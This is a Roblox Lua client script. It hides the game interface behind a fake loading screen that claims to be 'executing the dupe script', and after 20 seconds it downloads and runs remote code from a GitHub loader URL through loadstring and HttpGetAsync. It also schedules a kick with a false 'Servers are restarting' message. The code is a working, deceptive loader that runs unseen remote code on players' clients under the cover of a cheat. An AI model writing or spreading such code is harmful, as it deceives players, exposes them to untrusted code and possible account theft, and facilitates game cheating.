local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Hide built-in UI
StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)

-- GUI setup
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "RestartScreen"
screenGui.IgnoreGuiInset = true
screenGui.ResetOnSpawn = false
screenGui.Parent = playerGui

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.BackgroundColor3 = Color3.new(0, 0, 0)
bg.Active = true
bg.ZIndex = 1
bg.Parent = screenGui

-- Plug Image
local image = Instance.new("ImageLabel")
image.Size = UDim2.new(0, 200, 0, 200)
image.Position = UDim2.new(0.5, -100, 0.3, -100)
image.BackgroundTransparency = 1
image.Image = "rbxassetid://73366367355295"
image.ZIndex = 2
image.Parent = bg

-- Title Text
local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 60)
title.Position = UDim2.new(0, 0, 0.6, 0)
title.BackgroundTransparency = 1
title.Text = "Please wait..."
title.TextColor3 = Color3.new(1, 1, 1)
title.TextScaled = true
title.Font = Enum.Font.GothamBlack
title.ZIndex = 2
title.Parent = bg

-- Subtitle Text
local subtitle = Instance.new("TextLabel")
subtitle.Size = UDim2.new(1, 0, 0, 40)
subtitle.Position = UDim2.new(0, 0, 0.68, 0)
subtitle.BackgroundTransparency = 1
subtitle.Text = "We are currently executing the dupe script. This may take a moment."
subtitle.TextColor3 = Color3.fromRGB(200, 200, 200)
subtitle.TextScaled = true
subtitle.Font = Enum.Font.Gotham
subtitle.ZIndex = 2
subtitle.Parent = bg

-- Spinner
local spinner = Instance.new("ImageLabel", bg)
spinner.Size = UDim2.new(0, 40, 0, 40)
spinner.Position = UDim2.new(0.5, -20, 0.78, 0)
spinner.BackgroundTransparency = 1
spinner.Image = "rbxassetid://1095708"
spinner.ZIndex = 3

-- Spinner rotation logic
local angle = 0
local runConnection = RunService.RenderStepped:Connect(function()
    angle = (angle + 3) % 360
    spinner.Rotation = angle
end)

-- Progress Bar Background
local progressBarBg = Instance.new("Frame")
progressBarBg.Size = UDim2.new(0.6, 0, 0, 20)
progressBarBg.Position = UDim2.new(0.2, 0, 0.9, 0)
progressBarBg.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
progressBarBg.BorderSizePixel = 0
progressBarBg.ZIndex = 2
progressBarBg.Parent = bg

-- Progress Bar Fill
local progressBarFill = Instance.new("Frame")
progressBarFill.Size = UDim2.new(0, 0, 1, 0)
progressBarFill.Position = UDim2.new(0, 0, 0, 0)
progressBarFill.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
progressBarFill.BorderSizePixel = 0
progressBarFill.ZIndex = 3
progressBarFill.Parent = progressBarBg

-- Animate the progress bar over 20 seconds
TweenService:Create(progressBarFill, TweenInfo.new(20, Enum.EasingStyle.Linear), {
    Size = UDim2.new(1, 0, 1, 0)
}):Play()

-- After 20 seconds: Run script and fade out
task.delay(20, function()
    -- Run the No Lag script
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/NoLag-id/No-Lag-HUB/refs/heads/main/Loader/LoaderV1.lua"))()

    -- Fade out the whole GUI
    for _, obj in pairs(bg:GetDescendants()) do
        if obj:IsA("TextLabel") or obj:IsA("ImageLabel") or obj:IsA("Frame") then
            TweenService:Create(obj, TweenInfo.new(1), {BackgroundTransparency = 1, TextTransparency = 1, ImageTransparency = 1}):Play()
        end
    end

    TweenService:Create(bg, TweenInfo.new(1), {BackgroundTransparency = 1}):Play()

    -- Wait for fade to finish, then cleanup
    task.wait(1.5)
    runConnection:Disconnect()
    screenGui:Destroy()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
end)

-- Optional: Failsafe kick
task.delay(1000000, function()
    StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
    player:Kick("Servers are restarting... Please rejoin later.")
end)
